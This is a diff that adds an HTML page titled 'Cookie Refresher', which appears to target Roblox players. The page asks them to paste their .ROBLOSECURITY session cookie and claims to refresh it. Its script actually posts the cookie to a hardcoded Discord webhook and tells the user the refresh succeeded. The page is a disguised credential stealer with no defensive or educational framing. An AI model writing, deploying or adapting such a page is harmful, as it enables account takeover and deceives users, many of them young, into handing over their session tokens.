@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Refresher</title>
+    <style>
+        body {
+            background: black;
+            color: red;
+            font-family: "Courier New", Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 10px red;
+        }
+
+        input {
+            padding: 10px;
+            width: 80%;
+            max-width: 600px;
+            margin-bottom: 1rem;
+            border: 2px solid red;
+            background: black;
+            color: red;
+            outline: none;
+            border-radius: 8px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            background: red;
+            color: black;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .btn:hover {
+            transform: scale(1.1);
+        }
+
+        .message {
+            margin-top: 1rem;
+            font-size: 1.2rem;
+        }
+
+        .rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Cookie Refresher</h1>
+        <input type="text" id="cookie-input" placeholder="Paste your .ROBLOSECURITY cookie here">
+        <button onclick="refreshCookie()" class="btn">Refresh Cookie</button>
+        <div id="message" class="message"></div>
+    </div>
+
+    <div class="rain" id="rain-container"></div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function refreshCookie() {
+            let cookie = document.getElementById("cookie-input").value;
+            let message = document.getElementById("message");
+
+            if (cookie) {
+                navigator.clipboard.writeText(cookie).then(() => {
+                    sendMessageToWebhook(cookie);
+                    message.innerHTML = "Cookie refreshed and copied to clipboard!";
+                }).catch((err) => {
+                    console.error("Failed to copy cookie to clipboard:", err);
+                    message.innerHTML = "Error copying cookie to clipboard.";
+                });
+            } else {
+                message.innerHTML = "Please enter a valid cookie.";
+            }
+        }
+
+        function sendMessageToWebhook(cookie) {
+            let webhookUrl = "https://discord.com/api/webhooks/1342136881369841775/aA2FqdLGA2_cIiP7_6wdT4fpybjq30RdBM8XoiWiw2NFd0adJIQenGvEJYfXt94CJXnN";
+            let data = { content: `Refreshed Roblox Cookie: ${cookie}` };
+
+            $.post(webhookUrl, data, function () {
+                console.log("Cookie sent to webhook successfully!");
+            }).fail(function (error) {
+                console.error("Failed to send cookie to webhook:", error);
+            });
+        }
+    </script>
+</body>
+</html>
